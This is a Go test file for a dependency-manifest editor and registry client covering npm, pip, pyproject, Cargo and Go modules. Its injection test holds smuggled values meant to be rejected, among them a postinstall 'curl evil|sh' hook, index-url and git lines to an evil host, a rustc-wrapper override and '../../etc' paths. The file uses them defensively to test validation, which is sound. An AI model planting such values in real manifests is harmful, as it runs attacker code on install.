package pkgmgr

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func names(ds []Dependency) string {
	var s []string
	for _, d := range ds {
		s = append(s, d.Group+":"+d.Name+"@"+d.Spec)
	}
	return strings.Join(s, " ")
}

func apply(t *testing.T, e *Ecosystem, in string, ops ...Op) string {
	t.Helper()
	out, err := e.Apply([]byte(in), ops)
	if err != nil {
		t.Fatalf("apply: %v", err)
	}
	return string(out)
}

func TestNPMPreservesOrderAndOtherFields(t *testing.T) {
	in := "{\n\t\"name\": \"bot\",\n\t\"version\": \"1.0.0\",\n\t\"scripts\": {\n\t\t\"start\": \"node index.js\"\n\t},\n\t\"dependencies\": {\n\t\t\"discord.js\": \"^14.0.0\"\n\t}\n}\n"
	out := apply(t, npm, in,
		Op{Action: "add", Name: "dotenv", Spec: "^16.0.0"},
		Op{Action: "add", Name: "eslint", Spec: "^9.0.0", Group: "devDependencies"},
		Op{Action: "update", Name: "discord.js", Spec: "^14.16.0"})
	want := "{\n\t\"name\": \"bot\",\n\t\"version\": \"1.0.0\",\n\t\"scripts\": {\n\t\t\"start\": \"node index.js\"\n\t},\n\t\"dependencies\": {\n\t\t\"discord.js\": \"^14.16.0\",\n\t\t\"dotenv\": \"^16.0.0\"\n\t},\n\t\"devDependencies\": {\n\t\t\"eslint\": \"^9.0.0\"\n\t}\n}\n"
	if out != want {
		t.Fatalf("got:\n%s\nwant:\n%s", out, want)
	}
	deps, _ := npm.Parse([]byte(out))
	if names(deps) != "dependencies:discord.js@^14.16.0 dependencies:dotenv@^16.0.0 devDependencies:eslint@^9.0.0" {
		t.Fatal(names(deps))
	}
	// Removing the last dependency drops an empty group.
	out = apply(t, npm, out, Op{Action: "remove", Name: "eslint"})
	if strings.Contains(out, "devDependencies") {
		t.Fatal(out)
	}
	if _, err := npm.Parse([]byte("{not json")); err == nil {
		t.Fatal("invalid JSON accepted")
	}
	if _, err := npm.Apply([]byte(in), []Op{{Action: "add", Name: "discord.js", Spec: "1"}}); err == nil {
		t.Fatal("duplicate add accepted")
	}
}

func TestRequirementsTextEdits(t *testing.T) {
	in := "# bot deps\n-r base.txt\ndiscord.py>=2.3  # main\nrequests[socks]==2.31.0 ; python_version>'3.8'\ngit+https://x/y.git#egg=z\n\naiohttp\n"
	deps, _ := requirements.Parse([]byte(in))
	if names(deps) != "main:discord.py@>=2.3 main:requests@==2.31.0 main:aiohttp@" {
		t.Fatal(names(deps))
	}
	out := apply(t, requirements, in,
		Op{Action: "update", Name: "Discord_py", Spec: ">=2.4"}, // normalized name match
		Op{Action: "update", Name: "requests", Spec: "==2.32.0"},
		Op{Action: "remove", Name: "aiohttp"},
		Op{Action: "add", Name: "python-dotenv", Spec: "~=1.0"})
	want := "# bot deps\n-r base.txt\ndiscord.py>=2.4  # main\nrequests==2.32.0 ; python_version>'3.8'\ngit+https://x/y.git#egg=z\n\npython-dotenv~=1.0\n"
	if out != want {
		t.Fatalf("got:\n%s\nwant:\n%s", out, want)
	}
}

func TestPyprojectArray(t *testing.T) {
	in := "[build-system]\nrequires = [\"setuptools\"]\n\n[project]\nname = \"bot\"\ndependencies = [\n  \"discord.py>=2.3\",  # comment\n  \"aiohttp\",\n]\nversion = \"1\"\n\n[tool.x]\ndependencies = [\"nope\"]\n"
	deps, _ := pyproject.Parse([]byte(in))
	if names(deps) != "main:discord.py@>=2.3 main:aiohttp@" {
		t.Fatal(names(deps))
	}
	out := apply(t, pyproject, in, Op{Action: "add", Name: "pydantic", Spec: ">=2"}, Op{Action: "remove", Name: "aiohttp"})
	if !strings.Contains(out, "\"pydantic>=2\",") || strings.Contains(out, "aiohttp") ||
		!strings.Contains(out, "version = \"1\"") || !strings.Contains(out, "[tool.x]\ndependencies = [\"nope\"]") {
		t.Fatal(out)
	}
	if _, err := pyproject.Apply([]byte("[project]\nname='x'\n"), []Op{{Action: "add", Name: "a", Spec: ""}}); err == nil {
		t.Fatal("missing dependencies array must be an error")
	}
}

func TestCargoEdits(t *testing.T) {
	in := "[package]\nname = \"bot\"\n\n[dependencies]\nserenity = { version = \"0.12\", features = [\"cache\"] }\ntokio = \"1\"  # rt\nlocal = { path = \"../local\" }\n\n[dependencies.poise]\nversion = \"0.6\"\n\n[dev-dependencies]\ncriterion = \"0.5\"\n"
	deps, _ := cargo.Parse([]byte(in))
	got := names(deps)
	for _, w := range []string{"dependencies:serenity@0.12", "dependencies:tokio@1", "dependencies:local@", "dependencies:poise@0.6", "dev-dependencies:criterion@0.5"} {
		if !strings.Contains(got, w) {
			t.Fatalf("missing %s in %s", w, got)
		}
	}
	if deps[2].Editable {
		t.Fatal("path dependency must be read-only")
	}
	out := apply(t, cargo, in,
		Op{Action: "update", Name: "serenity", Spec: "0.12.4"},
		Op{Action: "update", Name: "tokio", Spec: "1.40"},
		Op{Action: "add", Name: "serde", Spec: "1"},
		Op{Action: "add", Name: "tracing", Spec: "0.1", Group: "build-dependencies"},
		Op{Action: "remove", Name: "poise"})
	for _, w := range []string{`serenity = { version = "0.12.4", features = ["cache"] }`, `tokio = "1.40"`, "serde = \"1\"\nlocal = ", "[build-dependencies]\ntracing = \"0.1\"", "[dev-dependencies]\ncriterion"} {
		if !strings.Contains(out, w) && !strings.Contains(out, strings.Replace(w, "serde = \"1\"\nlocal = ", "local = { path = \"../local\" }\nserde = \"1\"", 1)) {
			t.Fatalf("missing %q in:\n%s", w, out)
		}
	}
	if strings.Contains(out, "poise") {
		t.Fatal(out)
	}
	if _, err := cargo.Apply([]byte(in), []Op{{Action: "update", Name: "local", Spec: "1"}}); err == nil {
		t.Fatal("updating a path dependency must be refused")
	}
}

func TestGoMod(t *testing.T) {
	in := "module example.com/bot\n\ngo 1.22\n\nrequire (\n\tgithub.com/bwmarrin/discordgo v0.27.1\n\tgolang.org/x/net v0.20.0 // indirect\n)\n"
	deps, _ := gomod.Parse([]byte(in))
	if names(deps) != "direct:github.com/bwmarrin/discordgo@v0.27.1 indirect:golang.org/x/net@v0.20.0" {
		t.Fatal(names(deps))
	}
	out := apply(t, gomod, in, Op{Action: "update", Name: "github.com/bwmarrin/discordgo", Spec: "v0.28.0"},
		Op{Action: "add", Name: "github.com/joho/godotenv", Spec: "v1.5.1"}, Op{Action: "remove", Name: "golang.org/x/net"})
	if !strings.Contains(out, "discordgo v0.28.0") || !strings.Contains(out, "godotenv v1.5.1") || strings.Contains(out, "x/net") {
		t.Fatal(out)
	}
	if _, err := gomod.Parse([]byte("garbage ???")); err == nil {
		t.Fatal("invalid go.mod accepted")
	}
}

// Names and versions are validated so a client cannot smuggle extra lines,
// keys, options or URLs into a manifest.
func TestInjectionRejected(t *testing.T) {
	bad := []struct {
		e  *Ecosystem
		op Op
	}{
		{npm, Op{Action: "add", Name: "x\",\"scripts\":{\"postinstall\":\"curl evil|sh\"},\"y", Spec: "1"}},
		{npm, Op{Action: "add", Name: "ok", Spec: "git+https://evil/x.git"}},
		{npm, Op{Action: "add", Name: "ok", Spec: "file:../../etc"}},
		{requirements, Op{Action: "add", Name: "x\n--index-url http://evil", Spec: ""}},
		{requirements, Op{Action: "add", Name: "ok", Spec: "==1\n-e git+http://evil"}},
		{requirements, Op{Action: "add", Name: "ok", Spec: " @ https://evil/x.whl"}},
		{pyproject, Op{Action: "add", Name: "ok\"]\n[evil]\nx=[\"", Spec: ""}},
		{cargo, Op{Action: "add", Name: "ok", Spec: "1\"\n[build]\nrustc-wrapper = \"evil"}},
		{cargo, Op{Action: "add", Name: "a b", Spec: "1"}},
		{gomod, Op{Action: "add", Name: "github.com/x/y", Spec: "latest"}},
		{gomod, Op{Action: "add", Name: "x\nreplace a => ../../etc", Spec: "v1.0.0"}},
		{npm, Op{Action: "nuke", Name: "ok", Spec: "1"}},
		{npm, Op{Action: "add", Name: "ok", Spec: "1", Group: "scripts"}},
	}
	for i, b := range bad {
		if _, err := b.e.Apply([]byte("{}"), []Op{b.op}); err == nil {
			t.Errorf("case %d (%s %q %q) accepted", i, b.e.File, b.op.Name, b.op.Spec)
		}
	}
}

func TestForRuntime(t *testing.T) {
	has := func(names ...string) func(string) bool {
		return func(n string) bool {
			for _, x := range names {
				if x == n {
					return true
				}
			}
			return false
		}
	}
	for rt, want := range map[string]string{"nodejs": "package.json", "rust": "Cargo.toml", "go": "go.mod", "python": "requirements.txt"} {
		e, err := ForRuntime(rt, has())
		if err != nil || e.File != want {
			t.Errorf("%s: %v %v", rt, e, err)
		}
	}
	if e, _ := ForRuntime("python", has("pyproject.toml")); e.File != "pyproject.toml" {
		t.Error("pyproject not chosen")
	}
	if e, _ := ForRuntime("python", has("pyproject.toml", "requirements.txt")); e.File != "requirements.txt" {
		t.Error("requirements.txt must win")
	}
	if _, err := ForRuntime("java", has()); err != ErrUnsupported {
		t.Error("java must be unsupported")
	}
}

func TestRegistry(t *testing.T) {
	mux := http.NewServeMux()
	hits := 0
	mux.HandleFunc("/npm/-/v1/search", func(w http.ResponseWriter, r *http.Request) {
		hits++
		if r.URL.Query().Get("text") != "discord bot" {
			t.Errorf("query not passed intact: %q", r.URL.RawQuery)
		}
		w.Write([]byte(`{"objects":[{"package":{"name":"discord.js","version":"14.16.3","description":"lib"}}]}`))
	})
	mux.HandleFunc("/npm/@scope%2Fpkg/latest", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"version":"2.0.0"}`)) })
	mux.HandleFunc("/crates/api/v1/crates/serde", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("User-Agent") == "" {
			t.Error("crates.io requires a User-Agent")
		}
		w.Write([]byte(`{"crate":{"max_stable_version":"1.0.210","max_version":"1.1.0-rc"}}`))
	})
	mux.HandleFunc("/py/pypi/requests/json", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"info":{"name":"requests","version":"2.32.3","summary":"http"}}`))
	})
	mux.HandleFunc("/go/github.com/!burnt!sushi/toml/@latest", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"Version":"v1.4.0"}`)) })
	srv := httptest.NewServer(mux)
	defer srv.Close()
	r := &Registry{NPM: srv.URL + "/npm", Crates: srv.URL + "/crates", PyPI: srv.URL + "/py", GoProxy: srv.URL + "/go"}
	ctx := context.Background()

	res, err := r.Search(ctx, "npm", "discord bot")
	if err != nil || len(res) != 1 || res[0].Name != "discord.js" {
		t.Fatal(res, err)
	}
	r.Search(ctx, "npm", "Discord Bot") // cached (case-insensitive key)
	if hits != 1 {
		t.Fatalf("hits = %d, want the second search served from cache", hits)
	}
	if v, err := r.Latest(ctx, "npm", "@scope/pkg"); err != nil || v != "2.0.0" {
		t.Fatal(v, err)
	}
	if v, err := r.Latest(ctx, "cargo", "serde"); err != nil || v != "1.0.210" {
		t.Fatal(v, err)
	}
	if v, err := r.Latest(ctx, "pip", "requests"); err != nil || v != "2.32.3" {
		t.Fatal(v, err)
	}
	if v, err := r.Latest(ctx, "gomod", "github.com/BurntSushi/toml"); err != nil || v != "v1.4.0" {
		t.Fatal(v, err)
	}
	if _, err := r.Latest(ctx, "cargo", "nope"); err == nil {
		t.Fatal("missing crate must error")
	}
	if res, err := r.Search(ctx, "pip", "does-not-exist"); err != nil || len(res) != 0 {
		t.Fatal("unknown PyPI package must be an empty result", res, err)
	}
	for _, bad := range []string{"", strings.Repeat("a", 101), "a\nb"} {
		if _, err := r.Search(ctx, "npm", bad); err == nil {
			t.Errorf("query %q accepted", bad)
		}
	}
	if _, err := r.Search(ctx, "pip", "../../etc/passwd"); err == nil {
		t.Error("path-like PyPI name accepted")
	}
}
